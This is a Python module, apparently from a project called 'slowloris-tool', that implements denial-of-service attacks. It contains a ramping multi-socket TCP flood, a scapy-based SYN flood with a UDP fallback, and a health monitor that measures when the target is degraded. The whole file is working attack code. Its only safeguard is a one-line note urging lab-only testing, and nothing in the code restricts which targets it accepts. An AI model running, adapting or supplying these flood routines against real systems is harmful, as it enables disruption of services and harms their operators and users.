# src/slowloris_tool/attacks.py
# -*- coding: utf-8 -*-
"""
Attacks module for slowloris-tool.

Provides:
 - monitor_tcp_health(host, port) -> (ok: bool, rtt_seconds: float)
 - tcp_flood_ramp(...) : ramp-up TCP "application-layer" flood via many sockets
 - syn_flood_ramp(...) : ramp-up SYN flood using scapy when available, fallback UDP stimulator otherwise

Notes:
 - tcp_flood_ramp: duration=None -> steady-state runs until KeyboardInterrupt (Ctrl+C).
 - syn_flood_ramp: prefers scapy (install with `pip install scapy`). On Unix, run as root for raw send.
 - Always test in isolated lab / localhost.
"""

from __future__ import annotations

import socket
import threading
import time
import os
import sys
import random
import traceback
from typing import Tuple, Optional

# Try importing scapy for SYN capability; not required for TCP flood.
try:
    from scapy.all import IP, TCP, send  # type: ignore

    _SCAPY_AVAILABLE = True
except Exception:
    _SCAPY_AVAILABLE = False


# --------------------------------------
# Monitor helper
# --------------------------------------
def monitor_tcp_health(host: str, port: int, timeout: float = 2.0) -> Tuple[bool, float]:
    """
    Tries a short TCP connect to `host:port`. Returns (ok, rtt_seconds).
    ok=True if connection succeeded quickly; False on exception/timeout.
    """
    start = time.time()
    try:
        with socket.create_connection((host, port), timeout=timeout):
            pass
        rtt = time.time() - start
        return True, rtt
    except Exception:
        rtt = time.time() - start
        return False, rtt


# --------------------------------------
# TCP flood workers
# --------------------------------------
def _tcp_worker(host: str, port: int, stop_event: threading.Event, payload_size: int, send_interval: float):
    """
    Maintain a single TCP connection and periodically send payloads until stop_event is set.
    Designed to be simple and reasonably robust.
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
    except Exception:
        return

    try:
        while not stop_event.is_set():
            try:
                s.sendall(b"A" * int(payload_size))
            except Exception:
                break
            time.sleep(float(send_interval))
    finally:
        try:
            s.close()
        except Exception:
            pass


# --------------------------------------
# TCP flood with ramp-up and steady-state
# --------------------------------------
def tcp_flood_ramp(host: str,
                   port: int = 80,
                   start_sockets: int = 10,
                   step: int = 10,
                   max_sockets: int = 200,
                   step_duration: float = 10.0,
                   payload_size: int = 256,
                   send_interval: float = 1.0,
                   monitor_check_interval: float = 2.0,
                   monitor_timeout: float = 2.0,
                   impact_latency_threshold: float = 1.0,
                   duration: Optional[float] = None):
    """
    TCP flood with ramp-up + steady-state monitoring.

    Parameters
    ----------
    host, port : target
    start_sockets : initial number of concurrent sockets
    step : sockets added each step
    max_sockets : cap for sockets
    step_duration : seconds to wait/monitor between ramps
    payload_size : bytes sent per send()
    send_interval : seconds between send() calls per socket
    monitor_check_interval : how often to probe target health
    monitor_timeout : socket timeout for health checks
    impact_latency_threshold : rtt (s) threshold to consider target impacted
    duration : total seconds to keep steady-state after reaching max_sockets;
               if None -> stay in steady-state until KeyboardInterrupt
    """
    print(
        f"[+] tcp_flood_ramp -> {host}:{port} start={start_sockets} step={step} max={max_sockets} payload={payload_size} send_interval={send_interval} duration={duration}")

    stop_event = threading.Event()
    workers: list[threading.Thread] = []
    current = 0

    def start_n(n: int):
        nonlocal current
        for _ in range(n):
            t = threading.Thread(target=_tcp_worker, args=(host, port, stop_event, payload_size, send_interval),
                                 daemon=True)
            t.start()
            workers.append(t)
            current += 1

    start_n(start_sockets)

    try:
        while current < max_sockets and not stop_event.is_set():
            step_start = time.time()
            while time.time() - step_start < step_duration and not stop_event.is_set():
                ok, rtt = monitor_tcp_health(host, port, timeout=monitor_timeout)
                print(f"[monitor] ok={ok} rtt={rtt:.3f}s sockets={current}")
                if (not ok) or (rtt > impact_latency_threshold):
                    print("[!] Impact detected during ramp-up. Stopping ramp.")
                    stop_event.set()
                    break
                time.sleep(monitor_check_interval)
            if stop_event.is_set():
                break
            to_add = min(step, max_sockets - current)
            if to_add > 0:
                print(f"[+] Increasing sockets by {to_add} (now ~{current + to_add})")
                start_n(to_add)

        if stop_event.is_set():
            return

        # reached max_sockets -> steady-state
        print(f"[+] Reached target sockets ({current}). Entering steady-state monitoring.")
        steady_start = time.time()
        try:
            while not stop_event.is_set():
                ok, rtt = monitor_tcp_health(host, port, timeout=monitor_timeout)
                print(f"[monitor] ok={ok} rtt={rtt:.3f}s sockets={current}")
                if (not ok) or (rtt > impact_latency_threshold):
                    print("[!] Impact detected during steady-state. Stopping.")
                    break
                if duration is not None and (time.time() - steady_start) >= float(duration):
                    print(f"[+] Duration {duration}s elapsed, stopping steady-state.")
                    break
                time.sleep(monitor_check_interval)
        except KeyboardInterrupt:
            print("\n[+] KeyboardInterrupt received - stopping flood.")
    finally:
        stop_event.set()
        print("[+] Stopping workers, waiting threads to finish...")
        for t in workers:
            try:
                t.join(timeout=0.1)
            except Exception:
                pass
        print("[+] TCP flood finished.")


# --------------------------------------
# SYN flood ramp-up
# --------------------------------------
def syn_flood_ramp(host: str,
                   port: int = 80,
                   start_pps: int = 50,
                   step_pps: int = 50,
                   max_pps: int = 1000,
                   step_duration: float = 10.0,
                   monitor_check_interval: float = 2.0,
                   monitor_timeout: float = 2.0,
                   impact_latency_threshold: float = 1.0,
                   duration: Optional[float] = None):
    """
    SYN flood ramping logic.

    Implementation notes:
     - If scapy is available, it will be used to craft/send SYN packets (recommended).
       Running scapy send may still require admin/root privileges depending on OS.
     - If scapy is not available or raw sockets are impractical, we fallback to
       a non-destructive UDP stimulator approach to simulate network pressure.
     - duration: None => indefinite steady-state until Ctrl+C; otherwise stops after duration seconds.
    """
    print(
        f"[+] syn_flood_ramp -> {host}:{port} start_pps={start_pps} step_pps={step_pps} max_pps={max_pps} scapy={_SCAPY_AVAILABLE}")

    if _SCAPY_AVAILABLE:
        # On Unix, non-root may not be able to send raw packets.
        if hasattr(os, "geteuid") and os.geteuid() != 0:
            print("[!] Warning: scapy raw send may require root privileges on Unix. You may see failures.")

    pps = int(start_pps)
    stop_flag = False

    try:
        while pps <= max_pps and not stop_flag:
            print(f"[+] Running SYN send at ~{pps} pps for {step_duration}s")
            sent = 0
            start_batch = time.time()
            end_batch = start_batch + float(step_duration)

            if _SCAPY_AVAILABLE:
                # use scapy to send SYNs at approximate rate
                try:
                    while time.time() < end_batch and not stop_flag:
                        pkt = IP(dst=host) / TCP(dport=int(port), sport=random.randint(1024, 65535), flags="S")
                        send(pkt, verbose=False)
                        sent += 1
                        if pps > 0:
                            time.sleep(1.0 / float(pps))
                except KeyboardInterrupt:
                    print("\n[+] KeyboardInterrupt received - stopping SYN flood.")
                    stop_flag = True
                except Exception as e:
                    print(f"[!] Error while sending with scapy: {e}")
                    traceback.print_exc()
            else:
                # Fallback: UDP "stimulator" to create network pressure without raw sockets.
                # This is less accurate than a SYN flood, but useful for testing in environments
                # where raw sockets/scapy are not available (Windows without npcap).
                print("[!] scapy not available: using UDP stimulator fallback (not a real SYN flood).")
                try:
                    while time.time() < end_batch and not stop_flag:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            s.sendto(b"\x00" * 128, (host, int(port)))
                            s.close()
                            sent += 1
                        except Exception:
                            pass
                        if pps > 0:
                            time.sleep(1.0 / float(pps))
                except KeyboardInterrupt:
                    print("\n[+] KeyboardInterrupt received - stopping UDP stimulator.")
                    stop_flag = True

            try:
                ok, rtt = monitor_tcp_health(host, port, timeout=monitor_timeout)
                print(f"[monitor] ok={ok} rtt={rtt:.3f}s after sent~{sent}")
                if (not ok) or (rtt > impact_latency_threshold):
                    print("[!] Impact detected after sending stage - stopping ramp.")
                    break
            except Exception:
                print("[!] Monitor check failed; continuing or exiting depending on conditions.")

            pps = min(max_pps, pps + step_pps)

        if not stop_flag:
            print(
                f"[+] Reached pps={pps - step_pps if pps - step_pps > 0 else start_pps}. Entering steady-state monitoring.")
            steady_start = time.time()
            try:
                while not stop_flag:
                    ok, rtt = monitor_tcp_health(host, port, timeout=monitor_timeout)
                    print(f"[monitor] ok={ok} rtt={rtt:.3f}s pps~{pps}")
                    if (not ok) or (rtt > impact_latency_threshold):
                        print("[!] Impact detected during steady-state - stopping.")
                        break
                    if duration is not None and (time.time() - steady_start) >= float(duration):
                        print(f"[+] Duration {duration}s elapsed - stopping steady-state.")
                        break
                    time.sleep(monitor_check_interval)
            except KeyboardInterrupt:
                print("\n[+] KeyboardInterrupt received - stopping SYN flood/UDP stimulator.")
    finally:
        print("[+] SYN flood routine finished (packets may have been sent).")
